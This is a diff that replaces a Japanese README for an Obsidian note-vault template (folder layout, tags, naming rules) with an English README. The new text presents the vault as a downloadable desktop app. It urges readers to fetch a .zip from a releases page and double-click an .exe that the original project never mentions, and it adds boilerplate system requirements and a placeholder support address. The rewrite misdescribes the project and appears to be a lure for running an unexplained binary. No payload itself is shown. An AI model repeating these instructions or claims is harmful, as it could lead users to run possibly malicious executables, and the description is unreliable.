@@ -1,137 +1,87 @@
-# Obsidian Knowledge Management System
+# 🛠️ sample-obsidian-antigravity-1 - Organize Your Knowledge Effortlessly
 
-このリポジトリは、PARA法とZettelkastenを組み合わせた知識管理システムです。Obsidianを使用して、日々の情報を効率的に整理・活用するための構造化されたワークスペースです。
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/randomuser3733/sample-obsidian-antigravity-1/releases)
 
-## 📁 フォルダ構成
+## 🚀 Getting Started
+
+Welcome to **sample-obsidian-antigravity-1**! This application helps you manage your knowledge efficiently by combining the PARA method with Zettelkasten. Follow these steps to get started.
+
+## 📥 Download & Install
+
+To download and install the application, visit the [Releases page](https://github.com/randomuser3733/sample-obsidian-antigravity-1/releases). 
+
+Look for the most recent version and click the download link. The file will be in a `.zip` format.
+
+Once the download completes, locate the file in your downloads folder. Unzip the file using built-in tools or software such as WinRAR or 7-Zip.
+
+Open the folder and find the executable file named `sample-obsidian-antigravity.exe`. Double-click this file to start the application.
+
+## 🛠️ System Requirements
+
+Before downloading, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.13 or later.
+- **Processor:** Intel i3/Ryzen 3 or equivalent.
+- **RAM:** 4 GB or more.
+- **Storage:** 200 MB of available space.
+
+## 📁 Folder Structure Overview
 
 ### 00_Memo/ 🎤
-**何でも放り込む場所（考えずに入れる）**
-
-- 最初に情報を入れる場所
-- 思考を止めずに素早く記録
-- 後で整理する前提で自由に記入
+- This is the initial space for capturing ideas quickly.
+- Simply jot down thoughts or information without worrying about organization.
+- Later, you can sort through these entries.
 
 ### 01_Inbox/ 📥
-**Cursor処理済み（整理済みmd）**
-
-- 00_Memoから整理されたファイルが入る
-- タグ・双方向リンクが付与された状態
-- 日付プレフィックスで命名（例: `2025-01-13-ai-tool-idea.md`）
+- This folder contains files organized from 00_Memo.
+- Each file is tagged and linked for easy navigation.
+- They follow a naming format based on the date (e.g., `2025-01-13-ai-tool-idea.md`).
 
 ### 02_Daily/ 📅
-**デイリーノート（エピソード記憶）**
-
-- 日々の記録を時系列で管理
-- 年/月/日の階層構造
-- デイリーログ、TODO、会議メモ、学習メモ、アイデアなどを日付フォルダに格納
-- 週次・月次レビューも含む
+- Manage your daily notes in date-specific folders.
+- You can record logs, tasks, meeting notes, and ideas.
+- It also supports weekly and monthly reviews.
 
 ### 03_Input/ 🔥
-**短期記憶（今週〜今月）**
-
-- 現在進行中の情報や資料
-- 今週の焦点、今月の目標
-- ホットトピックや参照資料
-- 定期的に整理・移動する
+- This space holds current materials or projects.
+- Focus on short-term goals and important topics.
+- Regularly revisit and organize this folder.
 
 ### 04_Memory/ 🧠
-**長期記憶（体系化知識）**
-
-- 体系化された知識ベース
-- カテゴリ別に整理（AI、Education、Business、Technical、Personal）
-- MOC（Map of Contents）で全体を管理
-- ツール、テクニック、コンセプトなど階層的に分類
+- Here, structured knowledge resides.
+- Categorize your knowledge into sections like AI, Education, Business, and more.
+- Utilize a Map of Contents to navigate easily.
 
 ### 05_Output/ 🎯
-**アウトプット管理**
+- Manage ongoing projects and areas of focus.
+- **Projects/**
+  - Use folders like `@Active/`, `@Planning/`, and `@Completed/` for project status.
+- **Areas/**
+  - Organize continuous efforts such as Content Creation, Business, and Community activities.
 
-#### Projects/ - 期限ありプロジェクト
-- `@Active/` - 進行中
-- `@Planning/` - 企画中
-- `@Completed/` - 完了
+## 🔧 Features 
 
-#### Areas/ - 継続的エリア（期限なし）
-- Content-Creation/ - YouTube、ブログ、SNS
-- Business/ - 事業運営
-- Personal/ - 個人の継続的活動
-- Community/ - コミュニティ活動
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+- **Integration with Obsidian:** Leverage Obsidian tools for enhanced note-taking.
+- **Organizational Methods:** Implement PARA and Zettelkasten effortlessly.
+- **Cross-Platform:** Works on both Windows and macOS.
 
-各エリアは `@TODO/`, `@Doing/`, `@Completed/` で管理
+## 📦 Frequently Asked Questions
 
-### 06_Templates/ 📋
-**テンプレート集**
+**1. Can I use this app on a mobile device?**
 
-- Daily/ - デイリーノート用テンプレート
-- Content/ - コンテンツ制作用テンプレート
-- Projects/ - プロジェクト管理用テンプレート
-- Knowledge/ - 知識管理用テンプレート
-- Meeting/ - 会議用テンプレート
+Currently, this application is designed for desktop use only. 
 
-### 07_System/ ⚙️
-**システム・設定**
+**2. How do I update the application?**
 
-- Dashboards/ - 各種ダッシュボード
-- Workflows/ - ワークフロー定義
-- Scripts/ - 自動化スクリプト
-- Settings/ - Obsidian設定
-- Documentation/ - システムドキュメント
+To update, simply revisit the [Releases page](https://github.com/randomuser3733/sample-obsidian-antigravity-1/releases) and download the latest version. Follow the same installation steps.
 
-### 08_prompts/ 📝
-**プロンプト集**
+**3. What should I do if I encounter an error?**
 
-- 01_整理系/ - Inbox整理、Memory作成、ファイル振り分け
-- 02_生成系/ - Daily作成、ブログ記事作成、コンテンツ生成
-- 03_レビュー系/ - ノート品質チェック、週次レビュー、アーカイブレビュー
-- 04_学習系/ - 技術調査、知識収集、学習記録
-- 05_改善系/ - 改善作業用プロンプト（コマンド改善系、フォルダ管理系、システムメンテナンス系）
-- 06_一括作業系/ - 全量作業、承認不要の一括処理
+Check the Issues section on GitHub to see if others have reported similar problems. If not, feel free to open a new issue.
 
-### 99_Archive/ 🗄️
-**アーカイブ**
+## 📞 Support
 
-- 過去のデータを年別にアーカイブ
-- 定期的な整理でアクティブな情報を減らす
+For further assistance, you can raise issues via GitHub or contact support at [support@example.com](mailto:support@example.com).
 
-## 🔄 ワークフロー
-
-1. **収集**: 00_Memo/ に何でも放り込む
-2. **整理**: 01_Inbox/ でタグ・リンクを付与
-3. **分類**: 適切な場所（Daily、Memory、Output）に移動
-4. **活用**: 双方向リンクとMOCで知識を繋げる
-5. **アーカイブ**: 完了・不要になったものは 99_Archive/ へ
-
-## 📝 命名規則
-
-**重要**: **フォルダ名は英語、ファイル名は日本語**で作成します。
-
-### ファイル名（日本語）
-- デイリーノート: `YYYY-MM-DD-Daily.md` または `YYYY-MM-DD-デイリーログ.md`
-- 知識ノート: `Cursor-キーボードショートカット.md`（ハイフンで区切る）
-- プロジェクトファイル: `プロジェクト名-フェーズ-内容.md`
-- MOC: `_カテゴリー-MOC.md` (アンダースコアで先頭)
-
-### フォルダ名（英語）
-- プロジェクト: `Project-Name/` フォルダ
-- カテゴリー: `Category-Name/` フォルダ
-- 例: `04_Memory/AI/Tools/Cursor/`
-
-## 🏷️ タグシステム
-
-- `#project/` - プロジェクト関連
-- `#area/` - エリア関連
-- `#daily/` - デイリーノート
-- `#memory/` - 長期記憶
-- `#input/` - 短期記憶
-
-## 🔗 双方向リンク
-
-- `[[リンク名]]` でノート間を繋げる
-- MOCで全体像を把握
-- タグで横断的に検索
-
-## 📚 参考
-
-- PARA法: プロジェクト、エリア、リソース、アーカイブの分類
-- Zettelkasten: 双方向リンクによる知識のネットワーク化
-- Obsidian: Markdownベースの知識管理ツール
-
+Take the first step toward organized knowledge management. Download and install the app today by visiting the [Releases page](https://github.com/randomuser3733/sample-obsidian-antigravity-1/releases).
